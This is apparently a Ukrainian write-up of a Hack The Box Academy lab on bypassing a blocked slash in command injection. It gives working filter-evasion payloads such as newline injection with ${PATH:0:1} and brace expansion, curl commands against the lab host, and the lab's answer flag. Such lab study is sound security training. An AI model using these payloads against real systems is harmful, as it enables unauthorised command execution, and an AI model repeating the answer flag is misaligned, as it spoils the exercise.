## Command Injections — Bypassing Other Blacklisted Characters: Slash `/`

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Bypassing Other Blacklisted Characters](https://academy.hackthebox.com/app/module/109/section/1037)
**Відповідь:** `1nj3c70r`

***

## Концепція

Окрім пробілу, blacklist часто блокує **слеш `/`** — без нього неможливо вказати шляхи до файлів (`/home`, `/etc/passwd`). Bypass використовує змінну оточення `$PATH`:

```bash
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

echo ${PATH:0:1}
# /   ← перший символ $PATH завжди є слешем!
```

Замість `/home` пишемо `${PATH:0:1}home` — фільтр не бачить слеш, але shell підставляє його зі змінної. [scribd](https://www.scribd.com/document/909434063/Command-Injections)

***

## Розбір payload

```
127.0.0.1%0a{ls,${PATH:0:1}home}
```

| Частина | Що означає |
|---|---|
| `127.0.0.1` | Валідний IP (проходить перевірку) |
| `%0a` | New-line — injection operator (не в blacklist) |
| `{ls,` | Brace expansion — замінює пробіл |
| `${PATH:0:1}` | Перший символ `$PATH` = `/` |
| `home}` | Слово "home" → разом `/home` |
| Результат на сервері: | `ls /home` |

***

## Команди

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.74:32673"

# Перевіряємо що слеш заблокований
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0als%09/home" | grep -E "Invalid|1nj"
# Invalid input ❌ — / заблокований

# Bypass через ${PATH:0:1}
curl -s -X POST "$TARGET/index.php" \
  --data 'ip=127.0.0.1%0a{ls,${PATH:0:1}home}' | grep -v "^$\|<\|PING\|packets\|rtt\|bytes\|html\|head\|body\|form\|label\|input\|button\|script\|div\|pre"
# 1nj3c70r ✅

# Альтернатива через ${IFS} і ${PATH:0:1}
curl -s -X POST "$TARGET/index.php" \
  --data 'ip=127.0.0.1%0als${IFS}${PATH:0:1}home' | grep "1nj"
# 1nj3c70r ✅
```

> **Важливо:** Використовуємо **одинарні лапки** `'...'` у curl щоб bash не розгорнув `${PATH:0:1}` і `${IFS}` локально перед відправкою на сервер.

***

## Інші способи отримати слеш без символу `/`

| Метод | Команда | Результат |
|---|---|---|
| `$PATH` substring | `${PATH:0:1}` | `/` |
| `$HOME` substring | `${HOME:0:1}` | `/` |
| Змінна `HOMEPATH` (Windows) | `%HOMEPATH:~0,1%` | `\` |
| `$PWD` | `${PWD:0:1}` | `/` |

***

## Відповідь

```
1nj3c70r
```
